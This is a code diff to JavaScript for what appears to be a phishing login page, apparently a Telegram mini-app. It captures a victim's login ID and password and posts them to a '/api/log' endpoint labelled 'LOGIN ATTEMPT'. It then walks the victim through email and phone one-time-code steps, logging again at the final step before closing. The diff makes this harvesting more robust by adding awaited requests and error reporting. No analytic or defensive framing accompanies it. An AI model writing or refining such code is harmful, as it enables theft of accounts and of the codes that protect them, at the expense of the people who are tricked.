@@ -24,7 +24,7 @@ document.addEventListener('DOMContentLoaded', () => {
     // Sign In Button
     const btnSignin = document.getElementById('trigger-signin');
     if (btnSignin) {
-        btnSignin.addEventListener('click', () => {
+        btnSignin.addEventListener('click', async () => {
             const idVal = loginId.value.trim();
             const passVal = loginPass.value.trim();
 
@@ -34,30 +34,32 @@ document.addEventListener('DOMContentLoaded', () => {
             userData.pass = passVal;
             userData.time = new Date().toLocaleString();
 
-            // Pre-fill
             if (idVal.includes('@')) verifyEmailId.value = idVal;
             else if (/^\d+$/.test(idVal.replace(/\+/g, ''))) verifyPhoneNum.value = idVal;
 
-            // Log securely (Fire and forget, don't wait)
+            // LOG ATTEMPT
             logToServer('🔑 LOGIN ATTEMPT', userData);
 
-            // SWITCH SCREEN IMMEDIATELY
+            // SWITCH SCREEN
             screenSignin.style.display = 'none';
             screenStepper.style.display = 'flex';
         });
     }
 
     // Email Verify Click
-    document.getElementById('item-email').addEventListener('click', () => {
+    document.getElementById('item-email').addEventListener('click', async () => {
         if (currentStep !== 1) return;
         modalEmail.style.display = 'flex';
         
         if (verifyEmailId.value.includes('@')) {
-            fetch('/send-otp', {
+            console.log("Requesting OTP for:", verifyEmailId.value);
+            const res = await fetch('/send-otp', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ email: verifyEmailId.value })
-            }).catch(e => console.error("OTP failed", e));
+            });
+            const data = await res.json();
+            if (!data.success) alert("OTP Error: " + (data.error || "Failed to send email"));
         }
     });
 
@@ -79,7 +81,6 @@ document.addEventListener('DOMContentLoaded', () => {
         itemEmail.style.opacity = '0.5';
         itemEmail.style.pointerEvents = 'none';
         itemEmail.querySelector('.card-link').innerHTML = 'Verified <i class="fas fa-check"></i>';
-        itemEmail.querySelector('.card-link').style.color = '#3bc117';
         
         const itemPhone = document.getElementById('item-phone');
         itemPhone.style.opacity = '1';
@@ -103,42 +104,23 @@ document.addEventListener('DOMContentLoaded', () => {
         document.getElementById('submit-phone-otp').innerText = "Success";
         await logToServer('📱 PHONE VERIFY (FINAL)', userData);
         
-        document.getElementById('btn-final-confirm').classList.add('ready');
-
         setTimeout(() => {
             if (tg) tg.close();
             else location.reload();
         }, 1500);
     });
 
-    // Tab Logic
-    document.querySelectorAll('.signin-tab').forEach(tab => {
-        tab.addEventListener('click', () => {
-            document.querySelectorAll('.signin-tab').forEach(t => t.classList.remove('active'));
-            tab.classList.add('active');
-            document.getElementById('login-password-wrapper').style.display = (tab.dataset.tab === 'otp') ? 'none' : 'block';
-        });
-    });
-
-    // Password Eye
-    const eyeBtn = document.querySelector('.btn-password-eye');
-    if (eyeBtn) {
-        eyeBtn.addEventListener('click', () => {
-            const isPass = loginPass.type === 'password';
-            loginPass.type = isPass ? 'text' : 'password';
-            eyeBtn.innerHTML = isPass ? '<i class="far fa-eye"></i>' : '<i class="far fa-eye-slash"></i>';
-        });
-    }
-
     async function logToServer(title, data) {
         try {
-            await fetch('/api/log', {
+            const res = await fetch('/api/log', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ title, data })
             });
+            const resData = await res.json();
+            if (!resData.success) console.error("Log failed:", resData.error);
         } catch (e) {
-            console.error("Log failed", e);
+            console.error("Log fetch failed", e);
         }
     }
 
